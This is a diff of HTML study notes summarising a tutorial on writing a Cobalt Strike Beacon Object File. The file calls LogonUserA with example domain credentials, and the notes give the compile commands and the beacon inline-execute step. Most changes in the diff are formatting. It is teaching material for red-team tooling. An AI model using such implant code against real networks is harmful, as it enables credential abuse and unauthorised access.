@@ -2,9 +2,9 @@
 <head>
 <meta content="text/html; charset=utf-8" http-equiv="Content-Type"/>
 <title>Beacon Object Files - long</title>
-</head><body><span style="font-size: 16pt"><a href="https://hstechdocs.helpsystems.com/manuals/cobaltstrike/current/userguide/content/topics/beacon-object-files_main.htm">documentation</a><br/>
-</span><u><span style="font-size: 18pt"><br/>
-</span></u><u><span style="font-size: 18pt">Tutorial from our boy <b>Raphael Mudge</b></span></u><span style="font-size: 16pt"><br/>
+</head><body><tt><span style="font-size: 16pt"><a href="https://hstechdocs.helpsystems.com/manuals/cobaltstrike/current/userguide/content/topics/beacon-object-files_main.htm">documentation</a><br/>
+</span><span style="font-size: 18pt"><u><br/>
+</u></span><span style="font-size: 18pt"><u>Tutorial from our boy <b>Raphael Mudge</b></u></span><span style="font-size: 16pt"><br/>
 </span><br/>
 <span style="font-size: 14pt">Tutorial to make a BOF for modifying the <b>make_token</b><br/>
 <br/>
@@ -62,7 +62,7 @@ void go(char * buff, int len) {</span></span><span style="font-family: Rockwell"
 <li style="list-style-type: none"/>
 <li style="list-style-type: none">if (LogonUserA(&quot;Administrator&quot;, &quot;CORP&quot;, &quot;password1234!&quot;, LOGON_32_LOGON_INTERACTIVE, LOGON32_PROVIDER_DEFAULT, &amp;hToken)) {</li>
 <li style="list-style-type: none"><ul><li style="list-style-type: none"/>
-<li style="list-style-type: none"><b>BeaconPrintf</b>(CALLBACK_OUTPUT, &quot;Success!&quot;)		// <span style="color: #ff0000"><b>printf DOES NOT</b>work in BOFs, you must use <b>BeaconPrintf(callback parameter, printed Text)</b></span></li>
+<li style="list-style-type: none"><b>BeaconPrintf</b>(CALLBACK_OUTPUT, &quot;Success!&quot;)		// <b><span style="color: #ff0000">printf DOES NOT</span></b><span style="color: #ff0000">work in BOFs, you must use <b>BeaconPrintf(callback parameter, printed Text)</b></span></li>
 <li style="list-style-type: none">CloseHandle(hToken);  // we are gonna close the handle in order to prevent handle leaks</li>
 </ul>
 </li>
@@ -88,7 +88,7 @@ void go(char * buff, int len) {</span></span><span style="font-family: Rockwell"
 </ul>
 </li>
 <li style="list-style-type: none">For this to work we need to follow the conventions for calling win32 APIs</li>
-<li style="list-style-type: none"><ul><li style="list-style-type: none">we need to call the api so that the <b><u>library name</u></b><b>AND</b>the <b><u>function name</u></b>are available to our cobalt strike instance</li>
+<li style="list-style-type: none"><ul><li style="list-style-type: none">we need to call the api so that the <u><b>library name</b></u><b>AND</b>the <u><b>function name</b></u>are available to our cobalt strike instance</li>
 </ul>
 </li>
 <li style="list-style-type: none"/>
@@ -108,7 +108,7 @@ void go(char * buff, int len) {</span></span><span style="font-family: Rockwell"
 <li style="list-style-type: none">&gt; cd usr/share/mingw-w64/include</li>
 <li style="list-style-type: none"><i>use grep to try and find the API call</i></li>
 <li style="list-style-type: none">&gt; grep -r &quot;LogonUserA&quot; . </li>
-</span><li style="list-style-type: none"><ul><li style="list-style-type: none"><i><span style="font-size: 12pt"><b>out</b>&gt; WINADVAPI WINBOOL WINAPI LogonUserA (LPCSTR lpszUsername,LPCSTR lpszDomain, LPCSTR lpszPassword, DWORD dwLogonType, DWORD dwLogonProvider, PHANDLE phToken);</span></i></li>
+</span><li style="list-style-type: none"><ul><li style="list-style-type: none"><b><span style="font-size: 12pt"><i>out</i></span></b><span style="font-size: 12pt"><i>&gt; WINADVAPI WINBOOL WINAPI LogonUserA (LPCSTR lpszUsername,LPCSTR lpszDomain, LPCSTR lpszPassword, DWORD dwLogonType, DWORD dwLogonProvider, PHANDLE phToken);</i></span></li>
 </ul>
 </li>
 <span style="font-size: 14pt"><li style="list-style-type: none"><img src="image.png"/></li>
@@ -117,8 +117,8 @@ void go(char * buff, int len) {</span></span><span style="font-family: Rockwell"
 <span style="font-size: 14pt"><li style="list-style-type: none"/>
 <li style="list-style-type: none"/>
 <li style="list-style-type: none">Now that we have that we add it to the top of the file</li>
-<li style="list-style-type: none"><ul><b><span style="color: #ff0000"><li style="list-style-type: none">we also need to grab &quot;GetLastError&quot; and &quot;CloseHandle&quot;</li>
-</span></b></ul>
+<li style="list-style-type: none"><ul><span style="color: #ff0000"><b><li style="list-style-type: none">we also need to grab &quot;GetLastError&quot; and &quot;CloseHandle&quot;</li>
+</b></span></ul>
 </li>
 <li style="list-style-type: none"><span style="color: #000000">&gt; </span></li>
 </span><li style="list-style-type: none"><ul><span style="font-size: 14pt"><li style="list-style-type: none">grep -r &quot;GetLastError&quot; . </li>
@@ -126,7 +126,7 @@ void go(char * buff, int len) {</span></span><span style="font-family: Rockwell"
 </li>
 </ul>
 <br/>
-<span style="font-size: 12pt"><i><b>out</b><span style="color: #000000">&gt; </span>WINBASEAPI WINBOOL WINAPI GetLastError (VOID);</i></span><ul><li style="list-style-type: none"><ul><li style="list-style-type: none"/>
+<b><i><span style="font-size: 12pt">out</span></i></b><i><span style="font-size: 12pt"><span style="color: #000000">&gt; </span>WINBASEAPI WINBOOL WINAPI GetLastError (VOID);</span></i><ul><li style="list-style-type: none"><ul><li style="list-style-type: none"/>
 </ul>
 </li>
 <span style="font-size: 14pt"><li style="list-style-type: none"><span style="color: #000000">&gt; </span></li>
@@ -135,27 +135,27 @@ void go(char * buff, int len) {</span></span><span style="font-family: Rockwell"
 </li>
 </ul>
 <br/>
-<b><span style="font-size: 12pt"><i>out</i></span></b><span style="font-size: 12pt"><i>&gt; WINBASEAPI WINBOOL WINAPI CloseHandle (HANDLE hObject);</i></span><ul><li style="list-style-type: none"><ul><li style="list-style-type: none"/>
+<i><span style="font-size: 12pt"><b>out</b>&gt; WINBASEAPI WINBOOL WINAPI CloseHandle (HANDLE hObject);</span></i><ul><li style="list-style-type: none"><ul><li style="list-style-type: none"/>
 </ul>
 </li>
 <span style="font-size: 14pt"><li style="list-style-type: none"/>
 </span></ul>
 <span style="font-size: 14pt">===================================================<br/>
-</span><span style="font-family: Rockwell"><span style="font-size: 12pt">#include &lt;windows.h&gt;                           <br/>
+</span><span style="font-size: 12pt"><span style="font-family: Rockwell">#include &lt;windows.h&gt;                           <br/>
 #include &quot;beacon.h&quot;                           <br/>
 <br/>
-</span><span style="font-size: 14pt"><b>// notice the<span style="color: #ff0000"/><span style="color: #ff00ff">LIB$</span></b><span style="color: #ff0000">, </span><span style="color: #000000">we are refrencing the library</span><br/>
-<span style="color: #000000">// </span><span style="color: #ff00ff">find</span><span style="color: #ff00ff">more</span><span style="color: #ff00ff">information</span><span style="color: #ff00ff">below, </span>but <b><span style="color: #007f00">we need to do this for all API calls too</span></b><br/>
+</span></span><span style="font-family: Rockwell"><span style="font-size: 14pt"><b>// notice the<span style="color: #ff0000"/><span style="color: #ff00ff">LIB$</span></b><span style="color: #ff0000">, </span><span style="color: #000000">we are refrencing the library</span><br/>
+<span style="color: #000000">// </span><span style="color: #ff00ff">find</span><span style="color: #ff00ff">more</span><span style="color: #ff00ff">information</span><span style="color: #ff00ff">below, </span>but <span style="color: #007f00"><b>we need to do this for all API calls too</b></span><br/>
 <br/>
 WINADVAPI		WINBOOL  	WINAPI<span style="color: #ff00ff"><b>ADVAPI32$</b></span>LogonUserA (LPCSTR lpszUsername,LPCSTR lpszDomain, LPCSTR lpszPassword, DWORD dwLogonType, DWORD dwLogonProvider, PHANDLE phToken);<br/>
-WINBASEAPI 	WINBOOL 	WINAPI <span style="color: #ff00ff"><b>KERNEL32$</b></span>GetLastError (VOID);<br/>
-</span><span style="font-size: 14pt">WINBASEAPI 	DWORD		WINAPI <span style="color: #ff00ff"><b>KERNEL32$</b></span>CloseHandle (HANDLE hObject);</span><span style="font-size: 12pt"><br/>
+WINBASEAPI 	WINBOOL 	WINAPI <b><span style="color: #ff00ff">KERNEL32$</span></b>GetLastError (VOID);<br/>
+</span><span style="font-size: 14pt">WINBASEAPI 	DWORD		WINAPI <b><span style="color: #ff00ff">KERNEL32$</span></b>CloseHandle (HANDLE hObject);</span><span style="font-size: 12pt"><br/>
 </span><span style="font-size: 12pt"><br/>
 <br/>
 //set up entry point for BOF<br/>
 </span><span style="font-size: 12pt">void go(char * buff, int len) {</span><span style="font-size: 14pt"><br/>
-</span><ul><span style="color: #ff0000"><span style="font-size: 12pt"><li style="list-style-type: none">BOOL LogonUserA( 							//<b>we</b></li>
-</span></span><span style="font-size: 12pt"><li style="list-style-type: none"><ul><span style="color: #ff0000"><li style="list-style-type: none">LPCSTR lpszUsername,					// <b>can</b></li>
+</span><ul><span style="font-size: 12pt"><span style="color: #ff0000"><li style="list-style-type: none">BOOL LogonUserA( 							//<b>we</b></li>
+</span><li style="list-style-type: none"><ul><span style="color: #ff0000"><li style="list-style-type: none">LPCSTR lpszUsername,					// <b>can</b></li>
 <li style="list-style-type: none">LPCSTR lpszDomain, 						// <b>delete</b></li>
 <li style="list-style-type: none">LPCSTR lpszPassword, 					// <b>all</b></li>
 <li style="list-style-type: none">DWORD dwLogonType, 					// <b>of</b></li>
@@ -171,15 +171,15 @@ WINBASEAPI 	WINBOOL 	WINAPI <span style="color: #ff00ff"><b>KERNEL32$</b></span>
 <li style="list-style-type: none"/>
 </span></ul>
 </li>
-<span style="font-size: 14pt"><li style="list-style-type: none"><span style="color: #000000"><b>if (</b></span><b><span style="color: #007f00">ADVAPI32$</span></b>LogonUserA(&quot;Administrator&quot;, &quot;CORP&quot;, &quot;password1234!&quot;, LOGON_32_LOGON_INTERACTIVE, LOGON32_PROVIDER_DEFAULT, &amp;hToken)) {</li>
+<span style="font-size: 14pt"><li style="list-style-type: none"><b><span style="color: #000000">if (</span><span style="color: #007f00">ADVAPI32$</span></b>LogonUserA(&quot;Administrator&quot;, &quot;CORP&quot;, &quot;password1234!&quot;, LOGON_32_LOGON_INTERACTIVE, LOGON32_PROVIDER_DEFAULT, &amp;hToken)) {</li>
 <li style="list-style-type: none"><ul><li style="list-style-type: none"><ul><li style="list-style-type: none"/>
-<li style="list-style-type: none"><b>BeaconPrintf</b>(CALLBACK_OUTPUT, &quot;Success!&quot;)		// <b><span style="color: #ff0000">printf DOES NOT</span></b><span style="color: #ff0000">work in BOFs, you must use <b>BeaconPrintf(callback parameter, printed Text)</b></span></li>
-<li style="list-style-type: none"><span style="color: #007f00"><b>KERNEL32$</b></span>CloseHandle(hToken);  // we are gonna close the handle in order to prevent handle leaks</li>
+<li style="list-style-type: none"><b>BeaconPrintf</b>(CALLBACK_OUTPUT, &quot;Success!&quot;)		// <span style="color: #ff0000"><b>printf DOES NOT</b>work in BOFs, you must use <b>BeaconPrintf(callback parameter, printed Text)</b></span></li>
+<li style="list-style-type: none"><b><span style="color: #007f00">KERNEL32$</span></b>CloseHandle(hToken);  // we are gonna close the handle in order to prevent handle leaks</li>
 </ul>
 </li>
 <li style="list-style-type: none">}</li>
 <li style="list-style-type: none">else {</li>
-<li style="list-style-type: none"><ul><li style="list-style-type: none"><b>BeaconPrintf</b>(CALLBACK_ERROR, &quot;Failure: %d&quot;, <b><span style="color: #007f00">KERNEL32$</span></b>GetLastError());					// try the creds, print fail if it doesnt work and why</li>
+<li style="list-style-type: none"><ul><li style="list-style-type: none"><b>BeaconPrintf</b>(CALLBACK_ERROR, &quot;Failure: %d&quot;, <span style="color: #007f00"><b>KERNEL32$</b></span>GetLastError());					// try the creds, print fail if it doesnt work and why</li>
 </ul>
 </li>
 <li style="list-style-type: none">}</li>
@@ -194,8 +194,8 @@ WINBASEAPI 	WINBOOL 	WINAPI <span style="color: #ff00ff"><b>KERNEL32$</b></span>
 <br/>
 ============================================================<br/>
 <br/>
-<span style="color: #ff00ff"><span style="font-size: 20pt"><b>MORE INFORMATION LOL<br/>
-</b></span></span><span style="font-size: 16pt">So in the first example we called </span><span style="color: #ff00ff"><span style="font-family: Rockwell">ADVAPI32$</span></span><span style="font-size: 16pt"/><ul><li style="list-style-type: none"><span style="font-size: 16pt">when looking at the win32 api page, we can wee the library listed is the same one we called/ refrenced </span></li>
+<b><span style="font-size: 20pt"><span style="color: #ff00ff">MORE INFORMATION LOL<br/>
+</span></span></b><span style="font-size: 16pt">So in the first example we called </span><span style="font-family: Rockwell"><span style="color: #ff00ff">ADVAPI32$</span></span><span style="font-size: 16pt"/><ul><li style="list-style-type: none"><span style="font-size: 16pt">when looking at the win32 api page, we can wee the library listed is the same one we called/ refrenced </span></li>
 </ul>
 <img height="279" src="image 2.png" width="850"/><br/>
 <br/>
@@ -208,11 +208,11 @@ WINBASEAPI 	WINBOOL 	WINAPI <span style="color: #ff00ff"><b>KERNEL32$</b></span>
 <br/>
 We can now attempt to compile this script and use it within cobalt strike<ul><li style="list-style-type: none">&gt; x86_64-w64-mingw32-gcc -c luser.c luser.x64.o</li>
 </ul>
-</span><span style="font-size: 14pt">		</span><span style="font-size: 12pt"><i>***shouldnt have any errors or warnings***</i></span><ul><span style="font-size: 14pt"><li style="list-style-type: none"/>
-</span><li style="list-style-type: none"><u><span style="font-size: 18pt">We can take a look at the file</span></u></li>
+</span><span style="font-size: 14pt">		</span><i><span style="font-size: 12pt">***shouldnt have any errors or warnings***</span></i><ul><span style="font-size: 14pt"><li style="list-style-type: none"/>
+</span><li style="list-style-type: none"><span style="font-size: 18pt"><u>We can take a look at the file</u></span></li>
 <span style="font-size: 14pt"><li style="list-style-type: none">&gt;x86_64-w64-mingw32-objdump -s luser.64.o									</li>
 </span><li style="list-style-type: none"><span style="font-size: 14pt">&gt;x86_64-w64-mingw32-objdump -r luser.64.o</span></li>
-<li style="list-style-type: none"><ul><li style="list-style-type: none"><span style="font-size: 14pt">	<span style="font-size: 12pt"><i>-s to see sections														-r to see </i></span></span><span style="font-size: 12pt"><i>relocation table/records	</i></span><span style="font-size: 14pt">					</span></li>
+<li style="list-style-type: none"><ul><li style="list-style-type: none"><span style="font-size: 14pt">	<i><span style="font-size: 12pt">-s to see sections														-r to see </span></i></span><i><span style="font-size: 12pt">relocation table/records	</span></i><span style="font-size: 14pt">					</span></li>
 <span style="font-size: 14pt"><li style="list-style-type: none"><img height="384" src="image 5.png" width="550"/>					<img height="380" src="image 6.png" width="600"/></li>
 <li style="list-style-type: none"/>
 <li style="list-style-type: none">relocation table - places in the text section that need to be patched with the right kind of pointer/ offset to different parts of the sections and where the live in memory</li>
@@ -235,14 +235,14 @@ We can now attempt to compile this script and use it within cobalt strike<ul><li
 </span></ul>
 <span style="font-size: 14pt"><br/>
 <br/>
-<b><span style="font-size: 28pt">Import BOF as &lt;luser.x64.o&gt;</span></b><br/>
+<span style="font-size: 28pt"><b>Import BOF as &lt;luser.x64.o&gt;</b></span><br/>
 <ul><li style="list-style-type: none"><u>beacon</u>&gt; inline-execute /path/to/luser.x64.o</li>
 </ul>
 <br/>
 <img src="image 8.png"/><br/>
 <br/>
-<ul><li style="list-style-type: none"><ul><li style="list-style-type: none"><ul><li style="list-style-type: none"><ul><li style="list-style-type: none"><ul><li style="list-style-type: none"><ul><li style="list-style-type: none"><ul><li style="list-style-type: none"><ul><li style="list-style-type: none"><ul><li style="list-style-type: none"><ul><span style="font-size: 20pt"><span style="color: #ff0000"><li style="list-style-type: none">If you failed</li>
-</span></span><li style="list-style-type: none"><ul><span style="font-size: 20pt"><span style="color: #ff0000"><li style="list-style-type: none"><u>beacon</u>&gt; run net helpmsg &lt;errorcode&gt;</li>
+<ul><li style="list-style-type: none"><ul><li style="list-style-type: none"><ul><li style="list-style-type: none"><ul><li style="list-style-type: none"><ul><li style="list-style-type: none"><ul><li style="list-style-type: none"><ul><li style="list-style-type: none"><ul><li style="list-style-type: none"><ul><li style="list-style-type: none"><ul><span style="color: #ff0000"><span style="font-size: 20pt"><li style="list-style-type: none">If you failed</li>
+</span></span><li style="list-style-type: none"><ul><span style="color: #ff0000"><span style="font-size: 20pt"><li style="list-style-type: none"><u>beacon</u>&gt; run net helpmsg &lt;errorcode&gt;</li>
 </span></span></ul>
 </li>
 <li style="list-style-type: none"><img src="image 9.png"/></li>
@@ -329,4 +329,4 @@ We can now attempt to compile this script and use it within cobalt strike<ul><li
 <br/>
 <br/>
 <br/>
-</span></body></html>
+</span></tt></body></html>
